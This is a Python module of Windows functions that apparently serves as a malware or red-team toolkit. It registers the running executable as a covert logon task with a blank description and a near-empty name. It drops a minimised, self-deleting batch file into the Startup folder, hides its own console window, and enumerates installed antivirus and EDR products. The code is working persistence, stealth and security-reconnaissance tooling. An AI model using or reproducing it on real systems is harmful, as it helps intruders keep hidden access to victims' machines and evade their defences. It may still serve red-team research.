import os
import sys
from pathlib import Path
import ctypes
import win32process
import signal
import wmi
import win32com
import psutil

WINDOWS_AUTOSTART_PATH_IN_USER_HOME = r"AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"


def task_scheduler_new_logon_task(program: str, program_args: str, task_name: str, priority: int = None):
    """
    Creates a new task in the task scheduler that start a program whenever the current user logs on.

    :param program: The program to run on logon of the current user.
    :param program_args: The arguments for the program to run.
    :param task_name: The name of the task in the task scheduler.
    :param priority: Optional, the priority of the task, documented in here - 
        https://learn.microsoft.com/en-us/windows/win32/taskschd/tasksettings-priority. If not set, the
        priority is set to default by the task scheduler to the 7.
    """
    #Connection to Task Scheduler
    task = win32com.client.Dispatch("Schedule.Service")
    task.Connect()
    root_folder = task.GetFolder("\\")
    newtask = task.NewTask(0)

    # Trigger
    TASK_TRIGGER_LOGON = 9
    trigger = newtask.Triggers.Create(TASK_TRIGGER_LOGON)
    trigger.Id = "LogonTriggerId"
    trigger.UserId = os.environ.get("USERNAME") # current user account

    # Action
    TASK_ACTION_EXEC = 0
    action = newtask.Actions.Create(TASK_ACTION_EXEC)
    action.ID = ""

    action.Path = program
    action.Arguments = program_args

    # Parameters
    newtask.RegistrationInfo.Description = ""
    newtask.Settings.Enabled = True
    newtask.Settings.StopIfGoingOnBatteries = False

    if None != priority:
        newtask.Settings.Priority = priority

    # Saving
    TASK_CREATE_OR_UPDATE = 6
    TASK_LOGON_INTERACTIVE_TOKEN = 3
    root_folder.RegisterTaskDefinition(
        task_name,  # Python Task Test
        newtask,
        TASK_CREATE_OR_UPDATE,
        "",  # No user
        "",  # No password
        TASK_LOGON_INTERACTIVE_TOKEN)


def set_autostart_program(program: str, program_args: str, autostart_bat_file_name: str, is_for_only_one_reboot: bool):
    """
    Sets a program to run on the next system startup using the current user's autostart directory as silently as possible.

    :param program: The program to run on startup.
    :param program_args: The program's arguments.
    :param autostart_bat_file_name: The name of the ".bat" file that will be placed in the current user"s startup folder.
    :param is_for_only_one_reboot: if True, the ".bat" file that is placed in the current user"s startup folder
        deletes itself after it runs.
    """
    home = str(Path.home())
    autostart_path = os.path.join(home, WINDOWS_AUTOSTART_PATH_IN_USER_HOME)
    autostart_bat_file_name = f"{autostart_bat_file_name}.bat"
    autostart_file_path = os.path.join(autostart_path, autostart_bat_file_name)

    bat_cmd = f"@echo off\nstart \"\" /min /realtime cmd.exe /k {program} {program_args}"
    if is_for_only_one_reboot:
        bat_cmd = f"{bat_cmd}\ndel \"%~f0\""

    with open(autostart_file_path, "w") as f:
        f.write(bat_cmd)

def task_scheduler_stay_persistent_with_args(task_name: str = "a ", cmd_args: str = "", priority: int = 2):
    """
    Sets a task in the task scheduler to run the current program whenever the current user logs on.

    :param task_name: The name of the task in the task scheduler.
    :param cmd_args: The arguments for the program.
    :param priority: Optional, the priority of the task, documented in here - 
        https://learn.microsoft.com/en-us/windows/win32/taskschd/tasksettings-priority.
        The value of the priority in this case defaults to 2, as this is the highest priority value allowed
        to be set by an unprivileged user.
    """
    current_process = psutil.Process(os.getpid())
    task_scheduler_new_logon_task(current_process.exe(), cmd_args, task_name, priority)

def autostart_stay_persistent_with_args(autostart_bat_file_name: str = "a", cmd_args: str = "", is_for_only_one_reboot=True):
    """
    Sets the current executable path to run on the next system startup as silently as possible.

    :param autostart_file_name: Optional, the name of the ".bat" file that will be placed in the current user"s startup
        folder, defaults to "a".
    :param cmd_args: Optional, The arguments to pass the executable on startup, defaults to ""
    :param is_for_only_one_reboot: Optional, if True, the ".bat" file that is placed in the current user"s startup folder
        deletes itself after it runs, defaults to True
    """
    current_process = psutil.Process(os.getpid())
    set_autostart_program(current_process.exe(), cmd_args, autostart_bat_file_name, is_for_only_one_reboot)
    

def kill_process_window():
    """
    Hides and Kills the window of the current process.
    """
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()      
    if hwnd != 0:      
        ctypes.windll.user32.ShowWindow(hwnd, 0)      
        ctypes.windll.kernel32.CloseHandle(hwnd)
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        os.kill(pid, signal.SIGTERM)


def get_existing_anti_virus_display_names() -> set[str]:
    """
    Returns a set of the installed AV / EDR products using WMI.
    """
    wmi_client = wmi.WMI(namespace="SecurityCenter2")
    wmi_result = wmi_client.fetch_as_lists("AntiVirusProduct", ["DisplayName"])
    av_list = {wmi_result_item[0] for wmi_result_item in wmi_result}
    return av_list
